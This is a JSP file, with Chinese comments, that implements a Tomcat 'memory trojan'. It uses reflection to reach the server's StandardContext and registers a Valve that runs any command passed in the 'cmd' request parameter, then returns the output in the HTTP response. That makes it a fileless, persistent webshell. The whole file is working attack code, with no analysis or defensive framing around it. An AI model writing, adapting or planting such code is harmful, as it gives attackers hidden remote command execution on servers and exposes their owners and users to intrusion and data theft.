<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%--
  Created by IntelliJ IDEA.
  User: hasee
  Date: 2023/5/5
  Time: 9:58
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
    public class MemoryTrojanValve extends ValveBase {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            InputStream inputStream = Runtime.getRuntime().exec(request.getParameter("cmd").trim()).getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "GB2312"));
            String line;
            StringBuilder result = new StringBuilder();
            while ((line = bufferedReader.readLine()) != null) {
                result.append(line).append("\n");
            }
            bufferedReader.close();
            inputStream.close();
            System.out.println(result);
            response.setCharacterEncoding("GB2312");
            response.getWriter().write(result.toString().replaceAll("\n", "<\\br>"));
            response.getWriter().flush();
            response.getWriter().close();
        }
    }
%>
<%
    // 1. 获取 StandardContext
    ServletContext servletContext = request.getServletContext();
    // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    // 通过反射拿到 servletContext 具体的 ApplicationContext
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 2. 获取到 StandardContext（Container），然后添加阀门
    standardContext.addValve(new MemoryTrojanValve());
%>
</body>
</html>
